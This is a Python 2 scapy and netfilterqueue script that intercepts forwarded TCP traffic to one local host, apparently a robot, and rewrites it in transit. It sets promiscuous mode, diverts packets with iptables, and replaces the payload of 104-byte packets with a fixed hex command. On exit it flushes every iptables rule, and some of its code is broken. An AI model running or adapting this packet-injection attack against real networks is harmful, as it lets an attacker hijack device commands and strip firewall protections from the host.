#!/usr/bin/python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import sys
import os
import time

print "\n[*] Redirect traffic to the NFQUEUE... \n"
os.system("ip link set dev enp0s3 promisc on")
os.system("iptables -A FORWARD -p tcp -d 192.168.1.241 -j NFQUEUE --queue-num 1")
#os.system("iptables -t nat -A PREROUTING -p tcp -d "+robotIP+" -j NFQUEUE --queue-num 1")

def modify(packet):

    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string

    #modify the packet all you want here

    packet.set_payload(str(pkt)) #set the packet content to our modified version

    packet.accept() #accept the packet


def callback(payload):
    print "calback in"
    data = payload.get_data()
    pkt = IP(data)

    payload_before = len(pkt[TCP].payload)
    pkt[TCP].payload = str(pkt[TCP].payload).replace("hello","Hola")
    payload_after = len(pkt[TCP].payload)
    payload_dif = payload_after - payload_before    
    pkt[IP].len = pkt[IP].len + payload_dif

    #pkt[TCP].payload = str(pkt[TCP].payload).replace("ABC","GET")

    pkt[IP].ttl = 40

    print 'Data: '+ str(pkt[TCP].payload)
    print 'TTL: ' + str(pkt[IP].ttl)

    del pkt[IP].chksum
    pkt[TCP].chksum
    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))


def print_and_accept(pkt):
    print(pkt)
    #print pkt['TCP'].flags
    packet = IP(pkt.get_payload())

    #modify payload
    payload = str(packet[TCP].payload)
    print payload
    payload_hex='300000009a9999999999c9bf00000000000000000000000000000000000000000000000000000000000000000000000000000000'
    if packet[IP].len==104:
    	payload = str(payload_hex.decode("HEX"))    
    #payload = payload.replace("world","kajak")
    print payload
    packet[TCP].remove_payload()
    packet[TCP].add_payload(payload)

    #change some fields
    packet[IP].len = len(packet)
    del packet[IP].chksum
    del packet[TCP].chksum

    #packet = packet.__class__(str(packet))
    pkt.set_payload(str(packet))
    pkt.accept()


nfqueue = NetfilterQueue()
#1 is the iptabels rule queue number, modify is the callback function
nfqueue.bind(1, print_and_accept) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()
    os.system("iptables -F")


